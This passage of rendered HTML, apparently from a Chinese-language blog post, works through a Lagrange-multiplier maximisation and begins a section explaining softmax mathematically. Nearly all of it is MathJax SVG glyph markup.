-165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g></g><rect width=\"1456\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(13094.4,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(14150.2,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(14944.4,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(15944.7,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(16805.4,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(17861.2,0)\"><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(18639,0)\"><path data-c=\"21D2\" d=\"M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(19916.8,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(20766.6,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(21822.3,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mspace\" transform=\"translate(22405.3,0)\"/><g data-mml-node=\"mfrac\" transform=\"translate(22405.3,0)\"><g data-mml-node=\"mrow\" transform=\"translate(220,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"4C\" d=\"M62 -22T47 -22T32 -11Q32 -1 56 24T83 55Q113 96 138 172T180 320T234 473T323 609Q364 649 419 677T531 705Q559 705 578 696T604 671T615 645T618 623V611Q618 582 615 571T598 548Q581 531 558 520T518 509Q503 509 503 520Q503 523 505 536T507 560Q507 590 494 610T452 630Q423 630 410 617Q367 578 333 492T271 301T233 170Q211 123 204 112L198 103L224 102Q281 102 369 79T509 52H523Q535 64 544 87T579 128Q616 152 641 152Q656 152 656 142Q656 101 588 40T433 -22Q381 -22 289 1T156 28L141 29L131 20Q111 0 87 -11Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(273.5,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(566,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g></g><rect width=\"1456\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(24379.1,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(25434.9,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(26157.1,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(27157.3,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(27951.6,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(28951.8,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(29719.6,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(30775.3,0)\"><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(31553.1,0)\"><path data-c=\"21D2\" d=\"M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(32830.9,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(33625.1,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(34625.3,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(35393.1,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(36448.9,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g></svg></mjx-container></span>\n（即当这三个条件都满足的时候，目标函数最小，对乘子求导的结果就是约束）</p>\n<p>显然解得 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.781ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"6.131ex\" height=\"2.737ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -864.9 2710.1 1209.9\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(860.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(1916.6,0)\"><g data-mml-node=\"mn\" transform=\"translate(220,394) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(220,-345) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><rect width=\"553.6\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span></p>\n<p>所以最大值为 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.781ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"12.414ex\" height=\"2.737ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -864.9 5486.9 1209.9\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D453\" d=\"M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(550,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(939,0)\"><g data-mml-node=\"mn\" transform=\"translate(220,394) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(220,-345) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><rect width=\"553.6\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(1732.6,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(2177.2,0)\"><g data-mml-node=\"mn\" transform=\"translate(220,394) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(220,-345) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><rect width=\"553.6\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(2970.8,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3637.6,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(4693.3,0)\"><g data-mml-node=\"mn\" transform=\"translate(220,394) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(220,-345) scale(0.707)\"><path data-c=\"34\" d=\"M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z\"/></g><rect width=\"553.6\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span></p>\n<h2 id=\"softmax-数学解释\">Softmax 数学解释</h2>\n<p>我们要从一组得分 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.439ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"12.609ex\" height=\"1.439ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 5573.2 636\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(905.6,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(1350.2,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(2255.8,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2700.4,0)\"><path data-c=\"2026\" d=\"M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4039.1,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(4483.8,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D436\" d=\"M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 